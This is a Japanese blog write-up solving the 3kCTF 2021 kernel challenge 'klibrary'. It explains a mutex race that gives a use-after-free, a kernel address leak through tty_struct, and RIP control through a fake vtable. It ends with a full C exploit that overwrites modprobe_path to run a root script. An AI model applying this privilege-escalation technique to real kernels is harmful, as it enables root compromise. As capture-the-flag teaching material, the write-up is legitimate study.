# klibrary - 3kCTF 2021 

keyword
kernel exploit, tty_struct, kROP to overwrite modprobe_path, race w/ uffd


# イントロ

このエントリは[TSG Advent Calendar 2019](https://adventar.org/calendars/4182)の24日目の記事です。実に700日ほど遅れての投稿になります。
前回は**fiord**さんによる「[この世界で最も愛しい生物とそれに関する技術について - アルゴリズマーの備忘録](http://hyoga.hatenablog.com/entry/2019/12/22/012552)」でした。次回は**JP3BGY**さんによる「[GCCで返答保留になった話 | J's Lab](https://jp3bgy.github.io/blog/linux/2019/12/26/GCC.html)」**でした**。

すごくお腹が空いたので、いつぞや開催された**3kCTF 2021**のkernel問題である**klibrary**を解いていこうと思います。なんか最近サンタさん来ないんですが、悪い子なのかも知れないです。

# static

リシテア曰く。
```lysithea.sh
===============================
Drothea v1.0.0
[.] kernel version:
Linux version 5.9.10 (maher@maher) (gcc (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0, GNU ld (GNU Binutils for U1
[+] CONFIG_KALLSYMS_ALL is disabled.
cat: can't open '/proc/sys/kernel/unprivileged_bpf_disabled': No such file or directory
[!] unprivileged userfaultfd is enabled.
Ingrid v1.0.0
[.] userfaultfd is not disabled.
[-] CONFIG_DEVMEM is disabled.
===============================
```

割と手堅いけど、uffdができる。あとなんか`vmlinux`をstripせずにそのままくれてた、クリスマスプレゼントかも知れない。どうでもいいけど`CONFIG_KALLSYMS_ALL`が無効になってる、めずらし。SMEP/SMAP/KPTI/KASLRは全部有効。


# module overview

chrデバイス。`Book`構造体のdouble-linked listを保持。典型的なノート問題。
```book.c
struct Book {
  char book_description[BOOK_DESCRIPTION_SIZE];
  unsigned long index;
  struct Book* next;
  struct Book* prev;
} *root;
```

mutexを使っている。だが、わざわざ2つ(`ioctl_lock`, `remove_all_lock`)用意しているせいで、ロックを正常に取れていない(eg: `REMOVE_ALL + REMOVE`等)。
```.c
static DEFINE_MUTEX(ioctl_lock);
static DEFINE_MUTEX(remove_all_lock);

  if (cmd == CMD_REMOVE_ALL) {
    mutex_lock(&remove_all_lock);
    remove_all();
    mutex_unlock(&remove_all_lock);
  } else {
    mutex_lock(&ioctl_lock);

    switch (cmd) {
    case CMD_ADD:
      add_book(request.index);
      break;
    case CMD_REMOVE:
      remove_book(request.index);
      break;
    case CMD_ADD_DESC:
      add_description_to_book(request);
      break;
    case CMD_GET_DESC:
      get_book_description(request);
      break;
    }
```

THE・ノート問題のため、モジュールの詳細は省略。ソースコードを見てください。


# vuln 

上に貼ったコードの通り、`REMOVE_ALL`とその他のコマンドで異なるmutexを使っているため、この2種の操作でレースが生じる。`remove_all()`は双方向リストを根っこから辿って順々に`kfree()`していく。`add_description_to_book()/get_book_description()`では、リストからユーザ指定の`index`を持つ`Book`を探し出し、`copy_from_user()/copy_to_user()`で`Book`構造体にデータを直接出し入れする。
よって、`(add|get)_description()`で処理を止めている間に`remove_all()`で該当ノートを消してしまえばkUAFになる。最初にリシテアが言っていたようにunprivileged uffdが許可されているため、レースも簡単。

# leak kbase via tty_struct

さて、`struct Book`は`description`を直接埋め込んでいるため`kmalloc-1024`に入る大きさである。この大きさと言えば`struct tty_struct`。leakした後に適当にテキストっぽいものを選べばkbase leak完了! あと`tty_struct`はkbaseの他にもヒープのアドレス、とりわけ自分自身を指すアドレスを持っているため、これも忘れずにleakしておく。
![](https://i.imgur.com/jfoTuoM.png)

# get RIP via vtable in tty_struct

さてさて、今度はRIPを取る必要がある。や、まぁRIP取らなくても年は越せるんですが。
原理はleakと同じで、`copy_to_user()`でフォルトを起こして止めている間に、`remove_all`でそいつを`kfree()`しちゃう。その直後に`tty_struct`を確保することで、`tty_struct`に任意の値を書き込むことが出来る。
書き込む位置は指定できず、必ず`tty_struct`の先頭から0x300byte書き込むことになる。このとき、先頭のマジックナンバー(`0x5401`)が壊れていると`tty_ioctl()@drives/tty/tty_io.c`内の`tty_paranoia_check()`で処理が終わってしまうため、これだけはちゃんと上書きしておく。
![](https://i.imgur.com/dhLgqlY.png)

`tty_struct + 0x200`あたりにフェイクのvtableとして実行したいコードのアドレスを入れておく。あとは`ops`を書き換えるために、(オフセットとか考えるのめんどいから)全部`tty_struct + 0x200`のアドレスで上書きする。ここで必要な`tty_struct`自身のアドレスは、先程のleakの段階で入手できている。これでRIPも取れました。
![](https://i.imgur.com/z42Iu6o.png)

# overwriting modprobe_path just by repeating single gadget

さてさてさて、このあとの方針は色々とありそう。以前解いた[nutty](https://smallkirby.hatenablog.com/entry/2021/02/22/053507)では`tty_struct`の中でkROPをして`commit(pkc(0))`していた。けど、これはまぁ色々と面倒くさいし、この問題と少し状況が異なっていてstack pivotが簡単に出来なかったため却下。
上のスタックトレースは、`ioctl(ptmxfd, 0xdeadbeef, 0xcafebabe)`の結果なのだが、`RDX`/`RSI`が制御できていることが分かる。よって、`mov Q[rdx], rsi`とか`mov Q[rsi], rdx`みたいなガジェットを使うことで、任意アドレスの8byteを書き換えられる。`tty_struct`は意外と頑丈らしく、全部破壊的に書き換えたとしても正常に終了してくれるっぽいので、このガジェットを何回でも呼び出すことが出来る。よって、これで`modprobe_path`を書き換えれば終わり。
```gadget.txt
0xffffffff8113e9b0: mov qword [rdx], rsi ; ret  ;  (2 found)
0xffffffff81018c30: mov qword [rsi], rdx ; ret  ;  (4 found)
```

やっぱりこの方法めっちゃ楽。

# exploit

```exploit.c
#include "./exploit.h"
#include <fcntl.h>
#include <sched.h>

/*********** commands ******************/
#define DEV_PATH "/dev/library"   // the path the device is placed
#define CMD_ADD			0x3000
#define CMD_REMOVE		0x3001
#define CMD_REMOVE_ALL	0x3002
#define CMD_ADD_DESC	0x3003
#define CMD_GET_DESC 	0x3004

#define BOOK_DESCRIPTION_SIZE 0x300

/**********  types *********************/
typedef struct {
	unsigned long index;
	char* userland_pointer;
} Request;

#define GET_DESC_REGION          0x40000
#define ADD_DESC_REGION    0x50000

/*********** globals ****************/

char bigbuf[PAGE] = {0};
int fd, ttyfd;
ulong kbase = 0, tty_addr = 0;
scu mov_addr_rdx_rsi = 0x13e9b0;

// (END globals)

/********** utils ******************/

void add_book(int fd, ulong index) {
  Request req = {.index = index,};
  assert(ioctl(fd, CMD_ADD, &req) == 0);
}

void remove_all(int fd) {
  assert(ioctl(fd, CMD_REMOVE_ALL, remove_all) == 0);
}

// (END utils)

static void handler(ulong addr) {
  puts("[+] removing all books.");
  remove_all(fd);
  puts("[+] allocating tty_struct...");
  assert((ttyfd = open("/dev//ptmx", O_RDWR | O_NOCTTY)) > 3);
}

int main(int argc, char *argv[]) {
  system("echo -ne \"\\xff\\xff\\xff\\xff\" > /tmp/nirugiri");
  system("echo -ne \"#!/bin/sh\nchmod 777 /flag.txt && cat /flag.txt\" > /tmp/a");
  system("chmod +x /tmp/nirugiri");
  system("chmod +x /tmp/a");
  assert((fd = open(DEV_PATH, O_RDWR)) > 2);

  // spray
  for (int ix = 0; ix != 0x10; ++ix)
    assert(open("/dev/ptmx", O_RDWR | O_NOCTTY) > 3);

  // prepare
  add_book(fd, 0); add_book(fd, 1);

  // set uffd region
  struct skb_uffder *uffder = new_skb_uffder(GET_DESC_REGION, 1, bigbuf, handler, "getdesc");
  skb_uffd_start(uffder, NULL);
  sleep(1);

  // invoke uffd fault and remove all books while halting
  Request req = {.index = 1, .userland_pointer = (char*)GET_DESC_REGION};
  assert(ioctl(fd, CMD_GET_DESC, &req) == 0);

  assert((kbase = ((ulong*)GET_DESC_REGION)[0x210 / 8] - 0x14fc00) != 0);
  assert((tty_addr = ((ulong*)GET_DESC_REGION)[0x1c8 / 8] + 0x800) != 0);
  ulong modprobe_path = kbase + 0x837d00;
  ulong rop_start = kbase + mov_addr_rdx_rsi;
  printf("[!] kbase: 0x%lx\n", kbase);
  printf("[!] tty_struct : 0x%lx\n", tty_addr); // tty_addr is the Book[0]

  /****************************************************/

  // prepare
  add_book(fd, 0);

  // set uffd region
  struct skb_uffder *uffder2 = new_skb_uffder(ADD_DESC_REGION, 1, bigbuf, handler, "adddesc");
  skb_uffd_start(uffder2, NULL);
  *(unsigned*)bigbuf = 0x5401; // magic for paranoia check in tty_ioctl()

  // prepare fake vtable at the bottom of tty_struct
  for (int ix = 1; ix != BOOK_DESCRIPTION_SIZE / 8; ++ix) {
    ((unsigned long*)bigbuf)[ix] = tty_addr + 0x200;
  }
  for (int ix = BOOK_DESCRIPTION_SIZE / 8 / 3 * 2; ix != BOOK_DESCRIPTION_SIZE / 8; ++ix) {
    ((unsigned long*)bigbuf)[ix] = rop_start;
  }

  // invoke fault
  Request req2 = {.index = 0, .userland_pointer = (char*)ADD_DESC_REGION};
  assert(ioctl(fd, CMD_ADD_DESC, &req2) == 0);

  puts("[+] calling tty ioctl...");
  char *uo = "/tmp/a\x00";
  ioctl(ttyfd, ((unsigned *)uo)[0], modprobe_path);
  ioctl(ttyfd, ((unsigned *)uo)[1], modprobe_path + 4);

  puts("[+] executing evil script...");
  system("/tmp/nirugiri");
  system("cat /flag.txt");

  // end of life
  puts("[ ] END of life...");
  exit(0);
}
```

# アウトロ

![](https://i.imgur.com/QfokvAe.png)

風花雪月は4周目黄色ルートが終わりました。流石に飽きてきた可能性があり、5周目を始めるかどうか迷っています。

今年のアドベントカレンダーでは、「実家までこっそりと帰省して、バレないようにピンポンダッシュして東京に戻る」か「世界一きれいに手書きの『ぬ』を書きたい」のどちらかをテーマに書こうと思っています。また700日後にお会いしましょう。


# 参考
ニルギリ
https://youtu.be/yvUvamhYPHw




